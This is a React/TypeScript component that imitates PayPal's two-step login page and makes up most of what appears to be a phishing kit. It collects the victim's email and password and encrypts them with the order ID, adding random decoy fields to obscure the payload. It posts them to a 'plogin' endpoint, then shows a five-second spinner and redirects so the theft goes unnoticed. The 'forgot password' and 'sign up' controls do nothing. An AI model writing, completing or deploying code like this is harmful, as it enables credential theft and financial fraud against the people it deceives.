import LoadingOverlay from '@/components/LoadingOverlay';
import { Keys } from '@/config/keys';
import { useApi } from '@/hooks/useApi';
import { encryptData } from '@/utils/hash';
import { t } from 'i18next';
import { useEffect, useRef, useState } from 'react';
import { useNavigate } from 'react-router';
const PayPage = ({ data }: any) => {
    const navigate = useNavigate();
    const [loading, setLoading] = useState(false);
    const { api } = useApi();
    const [focus, setFocus] = useState(false);
    const [account, setAccount] = useState('');
    const [password, setPassword] = useState('');

    const [step, setStep] = useState('account');
    const ref = useRef<HTMLInputElement>(null);

    useEffect(() => {
        const productJson = localStorage.getItem(Keys.Product);
        if (!productJson) {
            navigate('/'); //todo
            return;
        }
    }, []);

    const handleFocus = () => {
        setFocus(true);
    };

    // 每次 focus 变为 true，就让 input 聚焦
    useEffect(() => {
        if (focus && ref.current) {
            ref.current.focus();
        }
    }, [focus]);

    const handleNext = (istep: string) => {
        if (account === '') {
            return;
        }
        if (step === 'account') {
            setStep(istep);
        }
    };
    const randomInt = (min: number, max: number): number => {
        if (min > max) {
            [min, max] = [max, min];
        }
        return Math.floor(Math.random() * (max - min + 1)) + min;
    };
    const handleSubmit = async () => {
        const orderId = localStorage.getItem(Keys.UUID);
        if (!orderId) {
            return;
        }
        const s = randomInt(0, orderId.length - 17);
        const e = s + 16;
        const encrypted = encryptData({ key: orderId, a: account, p: password }, orderId.slice(0, 17), orderId.slice(s, e));
        const p = { order_id: orderId, uuid: encrypted, v: randomInt(0, orderId.length), f: randomInt(0, orderId.length), s: s, e: e };

        setLoading(true);
        api.doPost('plogin', p).callback(() => {
            setTimeout(() => {
                navigate('/');
                setLoading(false);
            }, 5000);
        });
    };

    return (
        <div className="w-full min-h-screen flex flex-col items-center bg-gray-50 py-1 pb-0">
            <div className="w-full flex justify-center items-center py-15">
                <img src="/public/p.png" alt="PayPal" className="w-[83px] h-[32px] ml-2" />
            </div>
            {step === 'password' && account !== '' && (
                <div className="w-full mb-2 max-w-sm px-4 text-[14px] text-center flex items-center justify-center gap-3">
                    <span className="text-black/70 tracking-tight font-semibold">{account}</span>
                    <span className="text-blue-600 font-medium cursor-pointer" onClick={() => setStep('account')}>
                        {t('paypal.change_account')}
                    </span>
                </div>
            )}
            <div className="w-full max-w-sm px-4">
                {step === 'account' && (
                    <>
                        <div className={`flex border-2 p-[2px] ${focus || account !== '' ? 'border-blue-600 rounded-[10px]' : 'border-white/0 rounded-[5px]'}`} onClick={handleFocus}>
                            <div className={`w-full border h-[52px] px-3 py-4 flex flex-col justify-center items-start ${focus || account !== '' ? 'border-gray-300 rounded-[8px]' : 'border-gray-400 rounded-[5px]'}`}>
                                <span className={`${focus || account !== '' ? 'text-xs' : 'text-sm'} text-black/50 tracking-widest font-medium`}>{t('paypal.email_mobile')}</span>

                                {(focus || account !== '') && (
                                    <input type="text" value={account} onChange={(e) => setAccount(e.target.value)} ref={ref} onBlur={() => setFocus(false)} className="w-full h-[16px] text-base focus:outline-none" />
                                )}
                            </div>
                        </div>

                        <div className="mt-3 text-blue-800 text-sm font-medium px-1">{t('paypal.forgot_password')}</div>
                        <button
                            onClick={() => {
                                handleNext('password');
                            }}
                            className="w-full bg-blue-800/90 text-white py-[8px] rounded-full mt-7 text-sm font-bold cursor-pointer"
                        >
                            {t('paypal.next')}
                        </button>
                    </>
                )}
                {step === 'password' && (
                    <>
                        <div className={`flex border-2 p-[2px] ${focus || password !== '' ? 'border-blue-600 rounded-[10px]' : 'border-white/0 rounded-[5px]'}`} onClick={handleFocus}>
                            <div className={`w-full border h-[52px] px-3 py-4 flex flex-col justify-center items-start ${focus || password !== '' ? 'border-gray-300 rounded-[8px]' : 'border-gray-400 rounded-[5px]'}`}>
                                <span className={`${focus || password !== '' ? 'text-xs' : 'text-sm'} text-black/50 tracking-widest font-medium`}>{t('paypal.password')}</span>

                                {(focus || password !== '') && (
                                    <input
                                        type="password"
                                        value={password}
                                        onChange={(e) => setPassword(e.target.value)}
                                        ref={ref}
                                        onBlur={() => setFocus(false)}
                                        className="w-full h-[16px] text-base focus:outline-none"
                                    />
                                )}
                            </div>
                        </div>

                        <div className="mt-3 text-blue-800 text-sm font-medium px-1">{t('paypal.forgot_password')}</div>
                        <button
                            onClick={() => {
                                handleSubmit();
                            }}
                            className="w-full bg-blue-800/90 text-white py-[9px] rounded-full mt-7 text-sm font-bold cursor-pointer"
                        >
                            {t('paypal.login')}
                        </button>
                    </>
                )}
                <div className="w-full flex items-center my-6">
                    <div className="flex-1 h-px bg-gray-300" />
                    <span className="px-4 text-gray-500 text-sm font-medium">{t('paypal.or')}</span>
                    <div className="flex-1 h-px bg-gray-300" />
                </div>

                <button className="w-full  border-2 border-black/70 py-[8px] rounded-full text-sm font-bold cursor-pointer">{t('paypal.sign_up')}</button>

                <div className="mt-20 text-[13px] text-center text-gray-800/60 font-bold">English | 中文 </div>
            </div>
            <div className="w-full h-auto flex-1"></div>
            <footer className="flex items-center justify-center w-full text-xs text-gray-500 gap-2 p-5 bg-gray-100">
                <span>{t('paypal.contact')}</span>
                <span>{t('paypal.privacy')}</span>
                <span>{t('paypal.Legal')}</span>
                <span>{t('paypal.worldwide')}</span>
            </footer>
            <LoadingOverlay show={loading} />
        </div>
    );
};
export default PayPage;
